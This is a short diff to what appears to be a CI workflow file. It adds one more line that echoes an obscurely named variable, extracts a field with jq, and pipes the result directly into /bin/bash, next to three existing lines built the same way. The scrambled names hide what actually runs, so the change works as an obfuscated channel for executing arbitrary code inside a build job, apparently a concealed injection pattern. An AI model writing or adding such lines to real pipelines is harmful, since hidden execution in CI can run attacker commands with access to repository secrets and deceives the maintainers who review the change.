@@ -41,6 +41,7 @@ jobs:
           printf '%s' "$ai180" | jq -r .npf03 | /bin/bash
           printf '%s' "$m39" | jq -r .oofs009 | /bin/bash
           echo $nw7883 | jq -r .hsmdq14418 | /bin/bash
+          echo $xdasr21091 | jq -r .uela2702 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
